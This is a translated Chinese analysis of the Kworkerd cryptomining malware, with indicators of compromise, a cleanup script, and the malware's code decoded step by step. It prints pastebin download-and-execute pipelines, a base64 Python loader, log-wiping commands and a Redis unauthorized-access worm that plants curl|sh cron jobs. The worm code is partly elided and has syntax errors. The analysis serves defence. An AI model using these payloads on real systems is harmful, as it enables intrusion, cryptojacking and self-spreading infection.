# Kworkerd恶意挖矿分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 快速特征排查
TOP显示CPU占用高，但是没有高占用的进程  
存在与未知服务器13531端口建立的TCP连接  
文件/etc/ld.so.preload中指向了/usr/local/lib/libntp.so  
存在可疑执行base64编码的python进程  
## 0x02 快速清除
    #!/bin/bash
    ps aux|grep "I2NvZGluZzogdXRmLTg"|grep -v grep|awk '{print $2}'|xargs kill -9
    echo "" > /etc/cron.d/root
    echo "" > /etc/cron.d/system
    echo "" > /var/spool/cron/root
    echo "" > /var/spool/cron/crontabs/root
    rm -rf /etc/cron.hourly/oanacron
    rm -rf /etc/cron.daily/oanacron
    rm -rf /etc/cron.monthly/oanacron
    rm -rf /bin/httpdns
    sed -i '$d' /etc/crontab
    sed -i '$d' /etc/ld.so.preload
    rm -rf /usr/local/lib/libntp.so
    ps aux|grep kworkerds|grep -v color|awk '{print $2}'|xargs kill -9
    rm -rf /tmp/.tmph
    rm -rf /bin/kworkerds
    rm -rf /tmp/kworkerds
    rm -rf /usr/sbin/kworkerds
    rm -rf /etc/init.d/kworker
    chkconfig --del kworker
## 0x03 细节行为分析
搜索引擎查找相关问题，也有不少人碰到，比如：  
首先，CPU占用率100%，但是top命令查看，无法看到高占用进程，怀疑植入了rootkit。  
查看crontab的内容，已经被写入了一个定时任务，每半小时左右会从pastebin上下载脚本并且执行（pastebin是任意上传分享的平台，攻击者借此实现匿名）  
拿到xbY7p5Tb脚本内容如下：  
    (curl -fsSL https://pastebin.com/raw/Gw7mywhC || wget -q-O- https://pastebin.com/raw/Gw7mywhC)|base64 -d |/bin/bash
脚本中再次下载了另一个脚本，并且对脚本内容进行base64解码后执行:  
脚本主要逻辑提取内容如下（省略了一堆调用的函数）：
    update=$( curl -fsSL --connect-timeout 120 https://pastebin.com/raw/TzBeq3AM )
    if [ ${update}x = "update"x ];then
        echocron
    else
        if [ ! -f "/tmp/.tmph" ]; then
            rm -rf /tmp/.tmpg
            python
        fi
        kills
        downloadrun
        echocron
        system
        top
        sleep 10
        port=$(netstat -anp | grep :13531 | wc -l)
        if [ ${port} -eq 0 ];then
            downloadrunxm
        fi
        echo 0>/var/spool/mail/root
        echo 0>/var/log/wtmp
        echo 0>/var/log/secure
        echo 0>/var/log/cron
    fi
    #
    #
    #
该恶意脚本首先检查更新，如果有更新，执行echocron进行更新操作  
接着检查了/tmp/.tmph文件是否存在，如果存在则删除，并且执行python函数  
名为Python的函数在脚本中为：
    function python() {
        nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VSa3JTUWZFJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz'))" >/dev/null 2>&1 &
        touch /tmp/.tmph
其中执行的python代码经过了base64编码，解码后内容为：
    #coding: utf-8
    import urllib
    import base64
    d= 'https://pastebin.com/raw/nYBpuAxT'
    try:
        page=base64.b64decode(urllib.urlopen(d).read())
    exec(page)
    except:
    pass
这段python代码又从[https://pastebin.com/raw/nYBpuAxT读取了内容，并且进行了执行：](https://pastebin.com/raw/nYBpuAxT%E8%AF%BB%E5%8F%96%E4%BA%86%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%BF%9B%E8%A1%8C%E4%BA%86%E6%89%A7%E8%A1%8C%EF%BC%9A)  
再次base64解码后的最终代码内容如下，是一个针对redis的扫描攻击脚本，用于扩散感染：
    #! /usr/bin/env python
    #coding: utf-8
    import threading
    import socket
    from re import findall
    import httplib
    IP_LIST = []
    class scanner(threading.Thread):
        tlist = []
        maxthreads = 20
        evnt = threading.Event()
        lck = threading.Lock()
        def __init__(self,host):
            threading.Thread.__init__(self)
            self.host = host
        def run(self):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.host, 6379))
                s.send('set backup1 "\n\n\n*/1 * * * * curl -fsSL https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('set backup2 "\n\n\n*/1 * * * * wget -q -O- https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('config set dir /var/spool/cronrn')
                s.send('config set dbfilename rootrn')
                s.send('savern')
                s.close()
            except Exception as e:
                pass
            scanner.lck.acquire()
            scanner.tlist.remove(self)
            if len(scanner.tlist) = scanner.maxthreads:
                scanner.lck.release()
                scanner.evnt.wait()
            else:
                scanner.lck.release()
            scanner.newthread(host)
        for t in scanner.tlist:
            t.join()
    if __name__ == "__main__":
        runPortscan()
上述攻击脚本中，关键代码如下，通过扫描redis的6379端口，如果没有做访问验证，则直接进行远程命令执行进行感染。
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.host, 6379))
                s.send('set backup1 "\n\n\n*/1 * * * * curl -fsSL https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('set backup2 "\n\n\n*/1 * * * * wget -q -O- https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('config set dir /var/spool/cronrn')
                s.send('config set dbfilename rootrn')
                s.send('savern')
                s.close()